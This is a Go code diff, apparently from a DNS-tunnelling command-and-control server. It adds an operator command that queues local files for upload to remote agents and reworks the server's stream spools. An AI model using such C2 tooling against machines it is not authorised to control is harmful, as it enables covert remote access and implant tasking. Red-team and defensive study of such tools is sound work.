@@ -3,6 +3,7 @@ package cmd
 import (
 	"bufio"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"strconv"
 	"strings"
@@ -35,10 +36,12 @@ Examples:
 
 		srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
 		h := &dnsserver.Handler{
-			StreamSpool:  make(map[string]protocol.DNSBuffer),
-			CommandSpool: make(map[string]protocol.Command), // only a single command per agent now
-			Agents:       make(map[string]protocol.Agent),
-			Log:          options.Logger,
+			IncomingStreamSpool: make(map[string]protocol.IncomingDNSBuffer),
+			OutgoingStreamSpool: make(map[string][]string),
+			CommandSpool:        make(map[string]protocol.Command), // only a single command per agent now
+			FileSpool:           make(map[string]protocol.File),
+			Agents:              make(map[string]protocol.Agent),
+			Log:                 options.Logger,
 		}
 		srv.Handler = h
 
@@ -117,7 +120,6 @@ Examples:
 				continue
 
 			} else if cmd == "back" && agentContext == "" {
-
 				fmt.Println("Not in agent context")
 				continue
 			}
@@ -128,6 +130,50 @@ Examples:
 				continue
 			}
 
+			// upload?
+			if strings.HasPrefix(cmd, "upload") {
+
+				params := strings.Split(cmd, " ")
+				_, s, d := params[0], params[1], params[2]
+
+				file, err := os.Open(s)
+				if err != nil {
+					fmt.Printf("error reading source file: %s\n", err.Error())
+					continue
+				}
+				defer file.Close()
+
+				fileInfo, err := file.Stat()
+				if err != nil {
+					fmt.Printf("error reading file info: %s\n", err.Error())
+					continue
+				}
+
+				fmt.Printf("Are you sure you want to upload local file %s to remote destination %s with size %d? (y/n)\n", s, d, fileInfo.Size())
+				var answer string
+				fmt.Scanln(&answer)
+
+				if answer != "y" {
+					fmt.Println("doing nothing")
+					continue
+				}
+
+				fileBuffer, err := ioutil.ReadAll(file)
+				if err != nil {
+					fmt.Printf("error reading file data: %s\n", err.Error())
+					continue
+				}
+
+				f := protocol.File{Destination: d}
+				f.Prepare(&fileBuffer, fileInfo)
+				h.FileSpool[agentContext] = f
+
+				fmt.Printf("queued upload of %s\n", s)
+
+				continue
+			}
+
+			// nothing matched, so assume that its a command to send over
 			command := strings.TrimSuffix(cmd, "\n")
 
 			// prepare and add the command
